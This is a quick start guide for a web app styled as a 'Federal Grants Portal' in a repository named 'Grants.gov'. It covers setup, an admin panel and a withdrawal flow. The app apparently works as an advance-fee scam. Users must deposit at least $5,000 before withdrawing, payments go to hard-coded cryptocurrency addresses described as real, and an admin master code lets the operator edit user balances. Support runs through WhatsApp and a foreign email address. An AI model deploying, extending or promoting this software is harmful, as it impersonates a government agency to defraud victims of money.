# Federal Grants Portal - Quick Start Guide

## 🚀 Getting Started

This guide will help you get the Federal Grants Portal up and running in minutes.

### Prerequisites

- **Node.js** 16.x or higher
- **npm** 7.x or higher
- **Git** for cloning the repository
- A modern web browser (Chrome, Firefox, Safari, Edge)

### Installation Steps

#### 1. Clone the Repository

```bash
git clone https://github.com/dannywalraven891-dotcom/Grants.gov.git
cd Grants.gov
```

#### 2. Install Dependencies

```bash
npm install
```

#### 3. Create Environment File

```bash
cp .env.example .env
```

#### 4. Configure Environment Variables

Edit `.env` with your settings:

```env
# Frontend
VITE_API_URL=http://localhost:5000
VITE_JWT_SECRET=your-secret-key-here

# Server
SERVER_PORT=5000
JWT_SECRET=your-secret-key-here
DB_PATH=./data/grants.db
NODE_ENV=development

# Email Configuration (optional for email verification)
EMAIL_HOST=smtp.gmail.com
EMAIL_PORT=587
EMAIL_USER=your-email@gmail.com
EMAIL_PASSWORD=your-app-password
EMAIL_FROM=Federal Grant Portal <noreply@yourdomainhere.com>

# Admin Settings
ADMIN_MASTER_CODE=Q5HJ-8ZK9-6RWB

# Support Contact
SUPPORT_PHONE=+1 (256) 563-1275
SUPPORT_EMAIL=hatcanoff779@owleyes.ch
SUPPORT_WHATSAPP=+1-256-563-1275

# Cryptocurrency Addresses
CRYPTO_ADDRESSES_BTC=bc1q036k7urq5pvjq29pep96ds4gftgmwycymnzs48
CRYPTO_ADDRESSES_ETH=0xb8DDf6611c7A8a5D726B68F2A5F110BD2B839dAd
CRYPTO_ADDRESSES_USDT=TWuspo2EFsdb551sVaXJjM7yZ3fGiP2UZ5
```

### Running the Application

#### Development Mode (with both frontend and backend)

```bash
npm run dev
```

This will start:
- Frontend on `http://localhost:5173`
- Backend on `http://localhost:5000`

#### Frontend Only

```bash
npm run dev:client
```

Frontend: `http://localhost:5173`

#### Backend Only

```bash
npm run dev:server
```

Backend: `http://localhost:5000`

### Production Build

```bash
# Build the frontend
npm run build

# Preview the production build
npm run preview

# Start the production server
NODE_ENV=production npm start
```

## 🧪 Testing the Application

### Test User Credentials

**Sign Up** with any email/password to create a test account:
- Email: `test@example.com`
- Password: `Password123` (minimum 8 chars, uppercase, lowercase, number)
- Username: Any username

**Login** with your created credentials

### Test Admin Panel

1. Click on the app logo/header area
2. Select "Admin Panel" (if visible)
3. Enter Master Code: `Q5HJ-8ZK9-6RWB`
4. Manage users, view transactions, and update settings

### Test Withdrawal Flow

1. Login to your account
2. Go to Dashboard
3. Make a deposit (minimum $5,000) - This is a test flow
4. After deposit verification, click "Withdraw Funds"
5. Select cryptocurrency type
6. Enter amount and wallet address
7. Confirm the transaction

### Test Cryptocurrency Addresses

Use these addresses for testing (these are real addresses in the system):

- **Bitcoin**: `bc1q036k7urq5pvjq29pep96ds4gftgmwycymnzs48`
- **Ethereum**: `0xb8DDf6611c7A8a5D726B68F2A5F110BD2B839dAd`
- **USDT**: `TWuspo2EFsdb551sVaXJjM7yZ3fGiP2UZ5`

## 📱 Features to Test

### Authentication
- ✅ Sign up with email
- ✅ Login with credentials
- ✅ Email verification (mock)
- ✅ Terms & Conditions acceptance
- ✅ Password validation

### User Features
- ✅ View account balance
- ✅ Dark mode toggle
- ✅ Language selection (8 languages)
- ✅ Dashboard with account info
- ✅ Support contact information
- ✅ Mobile responsive design

### Withdrawal Features
- ✅ Multi-crypto support (BTC, ETH, USDT)
- ✅ Real-time address validation
- ✅ Amount validation
- ✅ Transaction fee calculation
- ✅ Confirmation modal
- ✅ QR code display (ready for integration)
- ✅ Processing page with network status

### Admin Features
- ✅ Master code authentication
- ✅ User management table
- ✅ Edit user balance
- ✅ View user emails
- ✅ Transaction management
- ✅ Settings configuration
- ✅ Support contact updates

## 🔐 Security Notes

⚠️ **Important for Production:**

1. **Change Admin Master Code**
   ```bash
   # Update in .env
   ADMIN_MASTER_CODE=your-new-unique-code
   ```

2. **Use Strong Secrets**
   ```bash
   # Generate a strong JWT secret
   # Option 1: Using Node
   node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
   
   # Option 2: Using OpenSSL
   openssl rand -hex 32
   ```

3. **Set Up Email Service**
   - Configure real SMTP credentials for email verification
   - Use environment variables (never hardcode secrets)

4. **Enable HTTPS**
   - Use SSL/TLS certificates
   - Update `VITE_API_URL` to use `https://`

5. **Database Security**
   - Use a production database (PostgreSQL, MySQL)
   - Set up proper backups
   - Enable encryption at rest

6. **API Security**
   - Implement rate limiting
   - Use CORS properly
   - Add request validation
   - Monitor for suspicious activity

## 📊 Project Statistics

- **Frontend Components**: 10+
- **Pages**: 7
- **Languages Supported**: 8
- **Cryptocurrencies**: 3
- **Dark Mode**: ✅ Full support
- **Mobile Responsive**: ✅ Yes
- **TypeScript**: ✅ Complete
- **Validation Rules**: 15+

## 🛠 Troubleshooting

### Port Already in Use

```bash
# Change ports in .env
SERVER_PORT=5001

# Or kill process using port 5000
# On Mac/Linux:
lsof -ti:5000 | xargs kill -9

# On Windows:
netstat -ano | findstr :5000
taskkill /PID <PID> /F
```

### Module Not Found

```bash
# Clear node_modules and reinstall
rm -rf node_modules package-lock.json
npm install
```

### Vite Port Conflict

```bash
# Vite will automatically use next available port (5173+)
# Or specify port:
VITE_PORT=3000 npm run dev:client
```

### Environment Variables Not Loading

```bash
# Make sure .env is in root directory
# Restart dev server after changing .env
```

## 📚 Documentation

- [README.md](./README.md) - Full documentation
- [.env.example](./.env.example) - Environment variables
- [src/types/index.ts](./src/types/index.ts) - TypeScript types
- [src/utils/validation.ts](./src/utils/validation.ts) - Validation functions

## 🚀 Deployment

### Vercel (Recommended for Frontend)

```bash
npm run build
# Upload 'dist' folder to Vercel
```

### Heroku (Backend)

```bash
# Add Procfile
echo "web: npm start" > Procfile

# Deploy
git push heroku main
```

### Docker

```dockerfile
FROM node:16
WORKDIR /app
COPY . .
RUN npm install
RUN npm run build
EXPOSE 5000 5173
CMD ["npm", "start"]
```

```bash
docker build -t grants-portal .
docker run -p 5000:5000 -p 5173:5173 grants-portal
```

## 💬 Support

- **Email**: hatcanoff779@owleyes.ch
- **Phone**: +1 (256) 563-1275
- **WhatsApp**: [Chat](https://wa.me/12565631275)

## 📝 License

MIT License - See LICENSE file for details

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

---

**Happy coding! 🎉**

For more information, visit the [GitHub Repository](https://github.com/dannywalraven891-dotcom/Grants.gov)
